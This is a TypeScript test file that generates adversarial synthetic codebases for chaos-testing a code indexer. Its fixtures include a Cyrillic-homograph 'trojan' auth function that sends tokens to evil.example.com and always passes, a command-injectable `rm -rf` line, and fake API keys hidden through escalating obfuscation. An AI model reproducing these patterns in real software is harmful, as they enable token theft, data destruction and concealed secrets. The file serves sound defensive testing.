/**
 * MIKK CHAOS TEST — CORPUS GENERATORS (CHAOS EDITION)
 * ─────────────────────────────────────────────────────────────────────────────
 * Extended generators targeting trust violations, not just crashes.
 * Produces code designed to fool semantic indexers, taint trackers,
 * and call-graph builders into giving confidently wrong answers.
 */

import * as fs from "fs";
import * as path from "path";
import * as crypto from "crypto";

/**
 * Minimal mikk.json so the MCP server recognizes the project.
 *
 * Deep-merges `extras` so callers can override individual `declared` fields
 * without losing required sibling keys (overwrite, policies, etc.).
 * Every emitted module object has id + name + description + paths so that
 * ContractReader / MikkContractSchema.safeParse() succeeds every time.
 */
export function writeMikkJson(rootDir: string, extras: Record<string, any> = {}) {
  fs.mkdirSync(rootDir, { recursive: true });

  // ── default shape ────────────────────────────────────────────────────────
  const defaultDeclared = {
    modules: [
      { id: "core", name: "Core", description: "Core module", paths: ["core/**"] },
      { id: "test", name: "Test", description: "Test module", paths: ["test/**"] },
    ],
    constraints: ["shared must not import from app"],
    decisions: [],
  };

  // ── deep-merge declared so extra module lists survive intact ────────────
  const extraDeclared = extras.declared ?? {};
  const mergedDeclared: Record<string, any> = {
    ...defaultDeclared,
    ...extraDeclared,
  };

  // Guarantee every module has the required fields (id, name, description, paths)
  if (Array.isArray(mergedDeclared.modules)) {
    mergedDeclared.modules = mergedDeclared.modules.map((mod: any, i: number) => ({
      id: mod.id ?? `module_${i}`,
      name: mod.name ?? mod.id ?? `Module ${i}`,
      description: mod.description ?? `Auto-generated module ${i}`,
      paths: mod.paths ?? [],
      ...(mod.intent !== undefined ? { intent: mod.intent } : {}),
      ...(mod.owners !== undefined ? { owners: mod.owners } : {}),
      ...(mod.entryFunctions !== undefined ? { entryFunctions: mod.entryFunctions } : {}),
      ...(mod.parentId !== undefined ? { parentId: mod.parentId } : {}),
    }));
  }

  // Guarantee constraints are strings (not objects)
  if (Array.isArray(mergedDeclared.constraints)) {
    mergedDeclared.constraints = mergedDeclared.constraints.map((c: any) =>
      typeof c === "string" ? c : JSON.stringify(c)
    );
  }

  const contract = {
    version: "1.0.0",
    project: {
      name: "chaos-test-project",
      description: "Adversarial chaos testing",
      language: "typescript",
      ...(extras.project ?? {}),
    },
    declared: mergedDeclared,
    overwrite: {
      mode: "ask",
      requireConfirmation: true,
      ...(extras.overwrite ?? {}),
    },
    policies: {
      maxRiskScore: 70,
      maxImpactNodes: 10,
      protectedModules: ["auth"],
      enforceStrictBoundaries: true,
      requireReasoningForCritical: true,
      ...(extras.policies ?? {}),
    },
  };

  // Strip top-level extras keys we've already handled to avoid accidental duplication
  const { project: _p, declared: _d, overwrite: _o, policies: _po, ...otherExtras } = extras;
  Object.assign(contract, otherExtras);

  fs.writeFileSync(
    path.join(rootDir, "mikk.json"),
    JSON.stringify(contract, null, 2)
  );
}

/**
 * Generate a codebase with intentionally misleading function names.
 * "auth" does database work, "database" does auth, etc.
 * Used to test whether semantic search is based on NAMES or BEHAVIOR.
 */
export function generateMisleadingCorpus(rootDir: string, fileCount = 50): void {
  writeMikkJson(rootDir);
  const misleadingPairs = [
    ["authUser", "SELECT * FROM sessions WHERE token = $1"],
    ["validateToken", "bcrypt.hash(password, 10)"],
    ["hashPassword", "jwt.verify(token, secret)"],
    ["connectDatabase", "return req.headers.authorization"],
    ["sendEmail", "fs.readFileSync('/etc/config')"],
    ["renderTemplate", "exec(`rm -rf ${userInput}`)"],
    ["parseJSON", "httpClient.post(url, data)"],
    ["logMetrics", "crypto.createHash('md5').update(secret)"],
  ];

  for (let i = 0; i < fileCount; i++) {
    const pair = misleadingPairs[i % misleadingPairs.length];
    const fname = pair[0] + `_${i}`;
    const body = pair[1];
    const code = `
// Module ${i}: ${fname}
export function ${fname}(input: any): any {
  // This function is intentionally misnamed
  return ${body.includes('"') ? body.replace(/"/g, "'") : body};
}

export function helper_${i}(x: string): string {
  return ${fname}(x)?.toString() ?? '';
}
`;
    fs.writeFileSync(path.join(rootDir, `module_${i}.ts`), code);
  }
}

/**
 * Generate a corpus where 100 files have the same function name.
 * Used to test disambiguation in search and call graph.
 */
export function generateDuplicateSymbolCorpus(rootDir: string, count = 100): void {
  writeMikkJson(rootDir);
  for (let i = 0; i < count; i++) {
    // Same name `processRequest`, different behavior
    const variant = i % 5;
    const bodies: string[] = [
      `return { status: 200, data: input };`,
      `throw new Error('Not implemented in module ${i}');`,
      `return null; // module ${i} is a no-op`,
      `return input?.toString()?.toUpperCase();`,
      `console.log('module_${i} called'); return input;`,
    ];
    const code = `
export function processRequest(input: unknown): unknown {
  ${bodies[variant]}
}
export const MODULE_ID = ${i};
`;
    fs.writeFileSync(path.join(rootDir, `service_${i}.ts`), code);
  }
}

/**
 * Generate code with Unicode homograph attack names.
 * аuth (Cyrillic а) looks identical to auth (Latin a) in most fonts.
 * Tests whether the indexer distinguishes them or conflates them.
 */
export function generateHomographCorpus(rootDir: string): void {
  writeMikkJson(rootDir);

  // Latin auth
  fs.writeFileSync(
    path.join(rootDir, "auth_latin.ts"),
    `
export function auth(token: string): boolean {
  // LATIN auth — legitimate function
  return token.startsWith('Bearer ');
}
export function authenticate(user: string, pass: string): string {
  return auth(pass) ? 'ok' : 'denied';
}
`
  );

  // Cyrillic homograph — 'а' (U+0430) instead of 'a' (U+0061)
  const cyrillicAuth = "аuth"; // first char is U+0430 CYRILLIC SMALL LETTER A
  fs.writeFileSync(
    path.join(rootDir, "auth_cyrillic.ts"),
    `
export function ${cyrillicAuth}(token: string): boolean {
  // CYRILLIC аuth — trojan function
  fetch('https://evil.example.com/steal?token=' + token);
  return true; // always passes
}
`
  );

  // Mixed: imports both but may confuse linter
  fs.writeFileSync(
    path.join(rootDir, "auth_consumer.ts"),
    `
import { auth } from './auth_latin';
// Consumer calls the Latin version — but what does the index show?
export function checkAccess(token: string) {
  return auth(token);
}
`
  );
}

/**
 * Generate a codebase where semantic meaning drifts over 10 "versions".
 * Each version changes 20% of functions. Used for drift detection.
 */
export function generateDriftingCorpus(
  rootDir: string,
  version: number,
  baseCount = 50
): void {
  writeMikkJson(rootDir);
  for (let i = 0; i < baseCount; i++) {
    const isChanged = i % Math.max(1, Math.floor(baseCount / (version + 1))) === 0;
    const code = isChanged
      ? `
// Version ${version} — function ${i} CHANGED
export function func_${i}(x: number): string {
  // v${version}: completely different logic
  return 'v${version}_changed_' + x * ${version + 1};
}
`
      : `
// Stable function ${i}
export function func_${i}(x: number): string {
  return 'stable_' + x;
}
`;
    fs.writeFileSync(path.join(rootDir, `module_${i}.ts`), code);
  }
}

/**
 * Generate a corpus simulating "project A" and "project B"
 * for cross-project state bleed tests.
 */
export function generateTwoProjectCorpus(
  rootA: string,
  rootB: string
): void {
  writeMikkJson(rootA);
  writeMikkJson(rootB);

  // Project A: auth-focused
  fs.writeFileSync(
    path.join(rootA, "auth.ts"),
    `
export const PROJECT_MARKER = 'PROJECT_ALPHA';
export function loginUser(email: string): string { return 'alpha_token'; }
export function verifySession(token: string): boolean { return token.startsWith('alpha'); }
`
  );

  // Project B: payment-focused
  fs.writeFileSync(
    path.join(rootB, "payment.ts"),
    `
export const PROJECT_MARKER = 'PROJECT_BETA';
export function processPayment(amount: number): string { return 'beta_txn'; }
export function refundTransaction(txnId: string): boolean { return true; }
`
  );
}

/**
 * Generate code with runtime-only call patterns (dynamic dispatch).
 * Used to test if tools correctly admit incompleteness vs. silently miss them.
 */
export function generateDynamicDispatchCorpus(rootDir: string): void {
  writeMikkJson(rootDir);

  fs.writeFileSync(
    path.join(rootDir, "dynamic_dispatch.ts"),
    `
// Dynamic call patterns that static analysis cannot fully resolve

// (1) Method stored in variable
const handlers: Record<string, Function> = {
  'create': (x: any) => ({ created: x }),
  'delete': (x: any) => ({ deleted: x }),
};
export function dispatch(action: string, data: any) {
  return handlers[action]?.(data); // call graph tool CANNOT know which handler
}

// (2) Eval-based dispatch
export function evalDispatch(code: string) {
  return eval(code); // complete dynamic — tool should WARN, not silently skip
}

// (3) require() with runtime path
export function dynamicRequire(moduleName: string) {
  return require(moduleName); // runtime-only path
}

// (4) Callback array with unknown callers
export const middleware: Function[] = [];
export function runMiddleware(req: any) {
  middleware.forEach(fn => fn(req)); // callers registered at runtime
}

// (5) Reflection via bracket access
export class Service {
  method_a() { return 'a'; }
  method_b() { return 'b'; }
  
  callByName(name: string) {
    return (this as any)[name](); // dynamic — which method is called?
  }
}
`
  );
}

/**
 * Generate a codebase with secrets hidden via increasingly subtle obfuscation.
 * Escalates from plain-text to triple-encoded to semantically innocent names.
 */
export function generateEscalatingSecretsCorpus(rootDir: string, level: number): void {
  writeMikkJson(rootDir);
  const baseKey = `sk-proj-${crypto.randomBytes(20).toString("hex")}`;

  const levels: string[] = [
    // Level 0: Plain text — matches sk-proj-* pattern
    `const API_KEY = "${baseKey}";`,
    // Level 1: Base64
    `const ENCODED = "${Buffer.from(baseKey).toString("base64")}"; // b64`,
    // Level 2: Split + join
    `const P1="${baseKey.slice(0, 15)}", P2="${baseKey.slice(15, 30)}", P3="${baseKey.slice(30)}";\nconst KEY=P1+P2+P3;`,
    // Level 3: Hex escape inside template
    `const K = \`${"\\x" + Buffer.from(baseKey).toString("hex").match(/.{2}/g)!.join("\\x")}\`;`,
    // Level 4: Config object spread, innocent-looking name
    `const config = { dbPoolSize: 10, maxRetries: 3, _internal: "${baseKey}" };`,
    // Level 5: Deeply nested, innocuous path
    `export const settings = { network: { proxy: { auth: { credential: "${baseKey}" } } } };`,
  ];

  const content = levels.slice(0, level + 1).join("\n\n");
  fs.writeFileSync(path.join(rootDir, `secrets_level_${level}.ts`), content);
}

/**
 * Generate a codebase where deleting one file should invalidate many search results.
 * Tests tombstone/eviction logic in the index.
 */
export function generateTombstoneCorpus(rootDir: string): { sentinel: string; dependents: string[] } {
  writeMikkJson(rootDir);

  // The sentinel file — we'll delete this
  const sentinel = path.join(rootDir, "sentinel_auth_module.ts");
  fs.writeFileSync(
    sentinel,
    `
export const SENTINEL_UNIQUE_TOKEN = "SENTINEL_XYZ_12345";
export function sentinelFunction(): string { return SENTINEL_UNIQUE_TOKEN; }
`
  );

  // 20 files that import and use the sentinel
  const dependents: string[] = [];
  for (let i = 0; i < 20; i++) {
    const dep = path.join(rootDir, `dependent_${i}.ts`);
    fs.writeFileSync(
      dep,
      `
import { sentinelFunction } from './sentinel_auth_module';
export function consumer_${i}() { return sentinelFunction(); }
`
    );
    dependents.push(dep);
  }

  return { sentinel, dependents };
}
